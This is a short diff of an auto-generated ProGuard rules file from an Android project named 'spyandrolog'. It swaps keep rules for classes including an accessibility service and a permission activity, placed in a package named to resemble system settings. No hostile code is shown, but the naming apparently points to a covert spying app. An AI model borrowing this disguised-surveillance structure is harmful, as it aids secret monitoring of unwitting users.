@@ -116,8 +116,8 @@
 # The proguard configuration file for the following section is /home/user/StudioProjects/spyandrolog/app/build/intermediates/aapt_proguard_file/release/processReleaseResources/aapt_rules.txt
 -keep class androidx.core.app.CoreComponentFactory { <init>(); }
 -keep class androidx.startup.InitializationProvider { <init>(); }
--keep class com.AndroidSettingsServices.MainActivity { <init>(); }
--keep class com.MyAccessibilityService { <init>(); }
+-keep class com.AndroidSettingsServices.MyAccessibilityService { <init>(); }
+-keep class com.AndroidSettingsServices.PermissionActivity { <init>(); }
 -keep class android.widget.Space { <init>(android.content.Context, android.util.AttributeSet); }
 
 -keep class androidx.appcompat.app.AlertController$RecycleListView { <init>(android.content.Context, android.util.AttributeSet); }
